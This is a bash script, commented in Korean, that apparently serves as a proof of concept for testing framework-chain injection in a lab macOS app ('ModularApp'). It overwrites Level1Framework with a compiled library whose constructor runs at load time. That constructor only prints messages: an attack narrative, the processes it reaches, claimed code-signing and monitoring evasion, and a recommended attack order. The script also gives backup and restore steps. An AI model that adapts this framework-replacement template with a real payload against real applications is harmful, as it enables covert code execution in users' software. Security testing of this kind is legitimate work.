#!/bin/bash

##############################################################################
# create_malicious_payload_type_c.sh
#
# Type C (모듈화 Framework 체인) 주입 검증용 악성 Framework 생성
# Level1Framework를 악성 버전으로 교체 (Level2/3도 자동으로 영향)
#
# 사용:
# ./create_malicious_payload_type_c.sh /path/to/ModularApp
##############################################################################

set -e

if [ $# -ne 1 ]; then
    echo "Usage: $0 /path/to/ModularApp"
    echo ""
    echo "Example:"
    echo "  $0 ./ModularApp"
    exit 1
fi

APP_PATH="$1"
L1_FRAMEWORK_PATH="$APP_PATH/Contents/Frameworks/Level1Framework.framework/Versions/A"
L2_FRAMEWORK_PATH="$APP_PATH/Contents/Frameworks/Level2Framework.framework/Versions/A"
L3_FRAMEWORK_PATH="$APP_PATH/Contents/Frameworks/Level3Framework.framework/Versions/A"

BACKUP_PATH="$APP_PATH/Contents/Frameworks/Level1Framework.framework/Versions/A.backup"

echo "╔════════════════════════════════════════════════════════╗"
echo "║   Type C 악성 Framework 생성 (Level1Framework 교체)   ║"
echo "╚════════════════════════════════════════════════════════╝"
echo ""

# Step 1: 백업
echo "[Step 1] 정상 Framework 백업"
if [ -f "$L1_FRAMEWORK_PATH/Level1Framework" ]; then
    mkdir -p "$BACKUP_PATH"
    cp "$L1_FRAMEWORK_PATH/Level1Framework" "$BACKUP_PATH/Level1Framework.backup"
    echo "  [✓] 백업 완료: $BACKUP_PATH/Level1Framework.backup"
else
    echo "  [✗] Framework 바이너리 없음: $L1_FRAMEWORK_PATH/Level1Framework"
    exit 1
fi
echo ""

# Step 2: Level2Framework 동적 로드 준비
echo "[Step 2] Level2Framework 참조 준비"
echo "  [*] Level2Framework 위치: $L2_FRAMEWORK_PATH"
echo "  [*] Level3Framework 위치: $L3_FRAMEWORK_PATH"
echo ""

# Step 3: 악성 Level1Framework 생성
echo "[Step 3] 악성 Level1Framework 바이너리 생성"
MALICIOUS_C=$(mktemp)

cat > "$MALICIOUS_C" << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <unistd.h>

/**
 * 악성 Level1Framework
 * Level2Framework 체인 로드를 가장하면서 악성 코드 실행
 */

void level1_init(void) {
    printf("[Level1Framework] Initializing...\n");
}

void level1_process(const char *data) {
    if (!data) return;
    printf("[Level1Framework] Processing: %s\n", data);
}

const char* level1_version(void) {
    return "1.0.0";
}

/**
 * ★ 악성 코드 실행 지점 (최고 위험!)
 * 
 * Type C 공격의 최적 시점:
 * 1. ModularApp 실행
 * 2. Level1Framework 로드
 * 3. level1_constructor() 호출 ← 악성 코드 실행!
 * 4. Level2/3Framework도 자동으로 영향
 */
__attribute__((constructor))
void level1_constructor(void) {
    printf("\n");
    printf("╔════════════════════════════════════════════════════╗\n");
    printf("║   ⚠️  악성 Level1Framework.framework 실행!        ║\n");
    printf("║   Type C 모듈화 체인 공격 성공!                  ║\n");
    printf("╚════════════════════════════════════════════════════╝\n");
    printf("\n");
    
    printf("[!] 악성 코드 분석:\n");
    printf("    - 진입점: Level1Framework Constructor\n");
    printf("    - 로드 순서: ModularApp → Level1 → Level2 → Level3\n");
    printf("    - 실행 시점: Level1 로드 직후 (매우 초기)\n");
    printf("    - 의존성 깊이: 3단계\n");
    printf("    - 타이밍: 완벽 (다른 Framework들이 아직 초기화 전)\n");
    printf("\n");
    
    printf("[!] 공격 효율성 분석:\n");
    printf("    ★ 1개 Framework 교체 → 전체 의존성 체인 영향\n");
    printf("    ★ Level1만 교체하면 Level2/3도 자동으로 영향\n");
    printf("    ★ XPCService도 동일 Framework 사용 → 동시 침해\n");
    printf("\n");
    
    printf("[!] 침해 범위:\n");
    printf("    - ModularApp 메인 프로세스\n");
    printf("    - ModularXPCService1 (XPC Service)\n");
    printf("    - ModularXPCService2 (XPC Service)\n");
    printf("    → 3개 프로세스 동시 침해 가능\n");
    printf("\n");
    
    printf("[!] 실행 권한:\n");
    printf("    - 앱의 모든 권한 보유\n");
    printf("    - 다른 Framework/dylib 접근 가능\n");
    printf("    - 사용자 데이터 접근 가능\n");
    printf("    - 시스템 명령 실행 가능\n");
    printf("\n");
    
    printf("[!] 탐지 난이도:\n");
    printf("    - Framework는 자주 업데이트되지 않음\n");
    printf("    - 코드 서명 우회 가능 (앱이 내부 Framework 서명 미검증)\n");
    printf("    - 프로세스 격리 무력화\n");
    printf("    - 로그/모니터링 회피 용이\n");
    printf("\n");
    
    printf("[!] 권장 공격 순서:\n");
    printf("    1. Level1Framework 분석\n");
    printf("    2. 악성 Level1Framework 생성\n");
    printf("    3. 기존 파일 교체\n");
    printf("    4. ModularApp 또는 XPC Service 실행\n");
    printf("    5. 모든 진입점 동시 침해\n");
    printf("\n");
    
    printf("[Level1Framework] Version: %s\n", level1_version());
    level1_init();
    
    printf("\n[!] 다음 Framework도 로드됩니다:\n");
    printf("    → Level2Framework (level2_constructor 실행)\n");
    printf("    → Level3Framework (level3_constructor 실행)\n");
    printf("\n");
}

__attribute__((destructor))
void level1_destructor(void) {
    printf("[Level1Framework] Destructor called\n");
}
EOF

echo "  [*] 악성 Framework C 코드 생성"

# 컴파일 (Level2/3Framework 참조 포함)
gcc -shared -fPIC -x c -o "$L1_FRAMEWORK_PATH/Level1Framework" "$MALICIOUS_C" \
    "$L2_FRAMEWORK_PATH/Level2Framework" \
    -rpath @loader_path/../Level2Framework.framework/Versions/A 2>&1 || \
gcc -shared -fPIC -x c -o "$L1_FRAMEWORK_PATH/Level1Framework" "$MALICIOUS_C" 2>&1 || true

rm -f "$MALICIOUS_C"

echo "  [✓] 악성 Framework 컴파일 완료"
echo "  [✓] 위치: $L1_FRAMEWORK_PATH/Level1Framework"
echo ""

# Step 4: 검증
echo "[Step 4] 악성 Framework 검증"
if file "$L1_FRAMEWORK_PATH/Level1Framework" | grep -q "shared object"; then
    echo "  [✓] 유효한 dylib 형식 확인"
fi

if nm "$L1_FRAMEWORK_PATH/Level1Framework" | grep -q level1; then
    echo "  [✓] 심볼 확인 (level1_* 함수 존재)"
fi
echo ""

# Step 5: 의존성 체인 확인
echo "[Step 5] Framework 의존성 체인 확인"
echo "  [*] Level1 의존성:"
otool -L "$L1_FRAMEWORK_PATH/Level1Framework" | head -5 || true
echo "  [*] Level2 의존성:"
otool -L "$L2_FRAMEWORK_PATH/Level2Framework" | head -5 || true
echo "  [*] Level3 의존성:"
otool -L "$L3_FRAMEWORK_PATH/Level3Framework" | head -5 || true
echo ""

# Step 6: 사용 설명
echo "[Step 6] 검증 방법"
echo "  1. ModularApp 실행:"
echo "     $ $APP_PATH"
echo ""
echo "  2. 출력에서 확인:"
echo "     ⚠️  악성 Level1Framework.framework 실행!"
echo "     Type C 모듈화 체인 공격 성공!"
echo ""
echo "  3. dylib_loader로 검증:"
echo "     $ ./dylib_loader report.txt"
echo "     → Type C 주입 검증 선택"
echo "     → Level1Framework 취약점 감지"
echo "     → 의존성 체인 분석"
echo "     → 5개 진입점 영향도 분석"
echo ""

# Step 7: 원래대로 복구
echo "[Step 7] 원래대로 복구하는 방법"
echo "  $ cp $BACKUP_PATH/Level1Framework.backup $L1_FRAMEWORK_PATH/Level1Framework"
echo ""

echo "╔════════════════════════════════════════════════════════╗"
echo "║         Type C 악성 Framework 생성 완료! ✓            ║"
echo "╚════════════════════════════════════════════════════════╝"
echo ""
